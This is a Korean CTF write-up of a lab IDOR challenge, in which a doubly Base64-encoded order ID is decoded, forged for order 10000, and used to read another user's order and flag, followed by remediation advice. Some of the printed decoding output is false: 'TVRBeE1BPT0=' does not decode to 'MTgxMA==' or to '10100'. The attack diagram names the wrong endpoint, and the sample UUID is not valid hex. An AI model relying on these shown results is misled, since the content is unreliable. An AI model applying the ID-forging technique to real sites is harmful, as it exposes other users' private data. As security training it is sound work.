+++
title = "VulnABLE CTF [LUXORA] Write-up: IDOR 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "IDOR", "Silver", "Access Control", "Encoding", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: IDOR 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (IDOR)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/idor/silver`
- **목표**: 객체 ID가 단순한 숫자가 아닌 인코딩(Encoding)되거나 가벼운 해시(Hash) 처리된 상태로 전달되는 환경에서, 인코딩 방식을 역추적하여 다른 사용자의 주문 내역(Order History)을 조회하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/idor/silver` 페이지는 내 주문 내역을 확인하는 곳입니다. 내 주문 상세 페이지를 클릭했을 때의 URL을 확인해 봅니다.

**[요청 URL]**
```http
GET /idor/silver/order?id=TVRBeE1BPT0= HTTP/1.1
```

**[화면 출력]**
```html
<div class="order-details">
  <h3>Order #10100</h3>
  <p>Item: Laptop</p>
  <p>Status: Shipped</p>
</div>
```

**[해커의 사고 과정]**
1. Bronze 단계에서는 `id=1001` 처럼 명확한 숫자가 보였다.
2. 하지만 이번에는 `id=TVRBeE1BPT0=` 라는 이상한 문자열이 들어간다.
3. 끝에 `==` (패딩)가 붙어 있는 것으로 보아, 이는 암호화(Encryption)가 아니라 단순한 **Base64 인코딩**일 확률이 99%다.
4. 저 값을 디코딩(Decoding)해보면 내 주문 번호의 진짜 값이 나올 것이다!

---

## 💥 2. 취약점 식별 및 데이터 디코딩 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker (ID: 1) ] --(GET /profile?id=2)--> [ Web Server ]
                                              |-- Missing Ownership Check
                                              |-- Returns User 2's Profile
```


### 💡 파라미터 디코딩 (Decoding)
리눅스 터미널이나 CyberChef 도구를 이용하여 획득한 파라미터 값을 Base64로 디코딩해 봅니다.

```bash
$ echo "TVRBeE1BPT0=" | base64 -d
MTgxMA==
```

어라? 또다시 Base64처럼 생긴 문자열(`MTgxMA==`)이 나왔습니다. 개발자가 보안을 강화한답시고 **다중 인코딩(Multiple Encoding)**을 적용한 모양입니다. 한 번 더 디코딩해 봅니다.

```bash
$ echo "MTgxMA==" | base64 -d
10100
```

드디어 숫자가 나왔습니다! 화면에 출력된 내 주문 번호 `10100`과 정확히 일치합니다.

### 💡 파라미터 조작 및 재인코딩 (Encoding)
이제 우리는 타겟인 관리자의 주문 번호를 예측해야 합니다. 관리자의 주문 번호가 `10000` (아주 초기 주문)이거나 `10101` (내 다음 주문)일 수 있습니다. 여기서는 `10000`을 타겟으로 잡아보겠습니다.

해독했던 과정을 **역순으로(Reverse)** 수행하여 가짜 파라미터를 만듭니다.

```bash
# 1. 타겟 숫자(10000)를 첫 번째 Base64로 인코딩
$ echo -n "10000" | base64
MTAwMDA=

# 2. 첫 번째 인코딩 결과를 다시 두 번째 Base64로 인코딩 (다중 인코딩)
$ echo -n "MTAwMDA=" | base64
TVRBd01EQT0=
```
*(참고: `echo -n` 을 사용해야 불필요한 줄바꿈 문자 `\n` 가 포함되지 않아 정확한 해시가 생성됩니다.)*

---

## 🚀 3. 조작된 파라미터 전송 및 플래그 획득

우리가 직접 만든 Base64 인코딩 문자열을 URL에 얹어서 서버로 요청을 보냅니다.

**[조작된 요청 URL]**
```http
GET /idor/silver/order?id=TVRBd01EQT0= HTTP/1.1
```

### 🔍 서버의 응답
서버는 이 이상한 문자열을 내부적으로 두 번 Base64 디코딩하여 `10000` 이라는 숫자를 얻어냈습니다. 그리고는 권한 검증(Ownership Check) 없이 데이터베이스에서 10000번 주문 내역을 덜컥 꺼내어 렌더링해버립니다!

```html
<div class="order-details">
  <h3>Order #10000</h3>
  <p>Item: Server Rack [Classified]</p>
  <p>Status: Delivered</p>
  <p class="secret">FLAG{IDOR_🥈_BASE64_OBFUSCATION_D4E5F6}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

개발자가 보안을 핑계로 데이터를 꼬아놓았지만(Obscurity), 근본적인 접근 제어 로직을 추가하지 않았기 때문에 인코딩 규칙만 간파하면 똑같이 뚫린다는 것을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{IDOR_🥈_BASE64_OBFUSCATION_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
보안 업계의 가장 유명한 격언 중 하나는 **"모호함에 기댄 보안은 보안이 아니다(Security through Obscurity is not security)"** 입니다.

* **취약한 설계 방식**
개발자는 1001, 1002 처럼 숫자가 보이면 해커가 쉽게 조작할까 봐 데이터를 Base64나 단순 Hash로 덮어씌웠습니다. 하지만 인코딩/디코딩 규칙은 누구나 리버스 엔지니어링을 통해 알아낼 수 있습니다.

* **안전한 패치 가이드**
1. **백엔드 권한 검증 (필수)**: 파라미터가 암호화되어 있든 평문이든 상관없습니다. 디코딩을 거쳐 나온 최종 주문 번호(Order ID)가 **현재 세션의 주인이 결제한 주문 내역에 속하는지 DB에서 교차 검증**해야 합니다.
   ```javascript
   const orderId = decodeBase64(req.query.id);
   const currentUserId = req.session.user_id;

   // 이 주문이 현재 로그인한 유저의 것인지 DB에서 확인
   const order = await db.query("SELECT * FROM orders WHERE id = $1 AND user_id = $2", [orderId, currentUserId]);
   
   if (!order) {
       return res.status(403).send("Access Denied");
   }
   ```
2. **랜덤 토큰(UUID) 사용**: 주문 번호 자체를 순차적인 정수가 아닌, `a1b2c3d4-e5f6-7g8h-9i0j-k1l2m3n4o5p6` 와 같은 UUID v4 형태로 발급하면 예측 자체가 수학적으로 불가능해집니다.